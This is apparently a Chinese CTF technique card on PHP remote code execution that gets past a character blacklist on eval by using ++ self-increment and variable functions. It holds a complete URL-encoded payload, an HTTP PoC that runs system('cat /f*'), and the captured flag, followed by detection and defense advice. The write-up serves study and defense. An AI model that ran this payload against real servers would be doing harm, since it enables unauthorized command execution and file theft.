---
id: web-php-rce-no-alnum-self-increment-variable-function
title: PHP 无字母数字自增构造变量函数 RCE：黑名单下用 ++ 拼出函数名执行 cat /f*
type: scenario
domain: web
path: web/php/rce
technique: php-no-alnum-self-increment-variable-function
aliases:
- PHP 自增免杀
- 无字母数字 webshell
- 变量函数 RCE
- eval 黑名单绕过
- ++ 构造 system
- 无字母数字命令执行
tags:
- php
- rce
- eval
- waf-bypass
- self-increment
- variable-function
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V197
  verified_at: '2026-11-06T22:45:02+08:00'
  notes: 已对照原文及图47核对：eval长度<=200、字符黑名单、?__=system&_=cat /f*、URL编码payload与flag NSSCTF{d928d065-3610-484e-9449-3ea9079c3ce8}均一致；未在本地PHP 7/8复跑。
---

## 一句话结论

当 PHP 的 `eval` 点用黑名单禁止字母、数字与多数符号、但允许 `$`、`_`、`[]`、`++`、`=`、`;` 时，可以用 PHP 的字符串/数组自增和变量变量构造出函数名与参数，把函数调用写成 `$$_[__]($$_[_])`，再通过查询参数提供 `__=system`、`_=cat /f*`，在不出现任何字母数字的情况下执行系统命令。

## 原理

- PHP 允许“可变函数”：若 `$f = 'system'`，则 `$f('id')` 等价于 `system('id')`；也允许变量变量 `$$name` 按变量值访问变量。
- PHP 的 `++` 运算符对字符串做字典序自增（`'a'++` → `'b'`，`'z'++` → `'aa'`），对数组/字符串的组合可以逐步“长”出需要的字符；攻击者利用这一点，在不写字母/数字的前提下生成函数名或变量名。
- 黑名单 `/[!@#%^&*:'\-<?>\"\/|`a-zA-Z~\\0-9]/` 禁止了字母、数字、引号、点、斜杠、管道等，但没有禁止 `$`、`_`、`[`、`]`、`+`、`=`、`;`、括号；因此可以用变量、数组下标、自增和分号组织代码。
- 最终 `$$_[__]($$_[_])` 以变量函数方式调用 `$_['__']` 指定的函数（`system`），参数为 `$_['_']`（`cat /f*`）；这两个值来自查询字符串 `?__=system&_=cat /f*`，无需在 POST body 中出现字母。
- 为什么可行：黑名单只做字符级过滤，未限制语言特性；PHP 的动态特性（可变函数、变量变量、自增）足以在极小字符集内构造调用。PHP 8 对未定义常量的行为更严格，具体 payload 需按版本调整。

## 触发条件

- 存在 `eval($code)` 且 `$code` 来自用户输入（POST/GET）。
- 过滤为字符黑名单（禁字母/数字/常见符号），但未禁用 `$`、`_`、`[]`、`++`、`=`、`;`、括号等。
- 输入长度限制足够（本例 ≤200 字节），PHP 版本支持所用自增/变量变量语义（PHP 7 较宽松）。
- 可通过查询参数注入变量值（`?__=system&_=cat /f*`），或变量已在作用域中。

## 利用步骤

1. 分析过滤正则，列出允许字符：`$ _ [ ] + = ; ( )` 等；确认字母、数字、引号、点、斜杠被禁。
2. 在查询参数中提供函数名与命令：`?__=system&_=cat /f*`。
3. 在 POST `rce` 字段提交由允许字符构成的自增 payload（原文 URL 编码）：

```text
%24_%3D%5B%5D%3B+%24__%3D%24_%3D%3D%3D%24___%3B+%24_%3D%24_.%24_%3B+%24_%3D%24_%5B%24__%5D%3B+%24_%2B%2B%3B+%24_%2B%2B%3B+%24_%2B%2B%3B+%24___%3D%2B%2B%24_%3B+%24_%2B%2B%3B+%24__%3D%2B%2B%24_%3B+%24_%2B%2B%3B%24_%2B%2B%3B+%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B+%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B+%24_%2B%2B%3B%24_%2B%2B%3B+%24_%3D_.%24__.%24___.%2B%2B%24_%3B+%24%24_%5B__%5D%28%24%24_%5B_%5D%29%3B
```

4. 服务端 `eval` 后执行 `system('cat /f*')`，回显 flag（原文 `NSSCTF{d928d065-3610-484e-9449-3ea9079c3ce8}`）。
5. 若长度/字符限制变化，调整自增次数或改用 `get_defined_vars()`/`localeconv()` 等无参技巧（见关联卡）。
6. 授权测试中只执行 `id`/`echo` 等无害命令，不读取真实 flag/凭据。

## PoC

```http
POST /index.php?__=system&_=cat /f* HTTP/1.1
Content-Type: application/x-www-form-urlencoded

rce=%24_%3D%5B%5D%3B+%24__%3D%24_%3D%3D%3D%24___%3B+%24_%3D%24_.%24_%3B+%24_%3D%24_%5B%24__%5D%3B+%24_%2B%2B%3B+%24_%2B%2B%3B+%24_%2B%2B%3B+%24___%3D%2B%2B%24_%3B+%24_%2B%2B%3B+%24__%3D%2B%2B%24_%3B+%24_%2B%2B%3B%24_%2B%2B%3B+%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B+%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B+%24_%2B%2B%3B%24_%2B%2B%3B+%24_%3D_.%24__.%24___.%2B%2B%24_%3B+%24%24_%5B__%5D%28%24%24_%5B_%5D%29%3B
```

原文用该 payload 在 `strlen($rce) <= 200` 且黑名单过滤字母数字的条件下成功执行 `cat /f*`。本卡未在本库复跑；PHP 8 下未定义常量/变量变量语义可能不同，需按目标版本调整。

## 变体与关联

- 无参 RCE：`get_defined_vars()`、`localeconv()`、`session_id()`、`getallheaders()` 等（`web-php-rce-no-param-get-defined-vars`、`web-php-rce-no-param-localeconv-scandir-chdir`、`web-php-rce-eval-getallheaders-no-param-function-call`）。
- 变量函数：`$_GET['a']($_GET['b'])`（若允许字母）或 `assert`/`create_function`；PHP 7 之后 `assert` 不再是函数。
- 编码/混淆变体：异或、取反、base64、自增；目标是根据黑名单选择最小字符集。
- 关联卡：PHP 变量函数配置数组绕过（`web-generic-auth-php-variable-variable-config-array-bypass`）；命令参数黑名单（`web-php-rce-command-injection-blacklist-base64-tee-webshell`）。
- 边界：自增 payload 高度依赖 PHP 版本与作用域；不要把它当作通用免杀，应先在本地同版本验证。

## 检测与防御

- 根除 `eval`/动态执行：不要对用户输入使用 `eval`、`assert`、`create_function`；使用白名单解析器/模板。
- 字符黑名单无效：攻击者可用自增、变量变量、编码等方式构造；应改为“只允许明确的操作/参数”的 allowlist，并限制函数调用。
- 运行时防护：禁用危险函数（`system`/`exec`/`passthru`/`shell_exec`/`popen`/`proc_open`），使用 `disable_functions` + open_basedir + 沙箱；PHP 8 严格模式减少未定义常量利用。
- 检测信号：请求中出现大量 `$`/`_`/`[]`/`++`/`%2B` 组合、`eval` 参数无字母数字、查询参数名异常（`__`、`_`）；WAF 对自增 payload 做语义/长度/字符分布检测。
- 代码审计：搜索 `eval($_POST`、`eval($_GET`、`create_function`、`assert($_` 等模式；对输入做类型/长度/字符白名单。
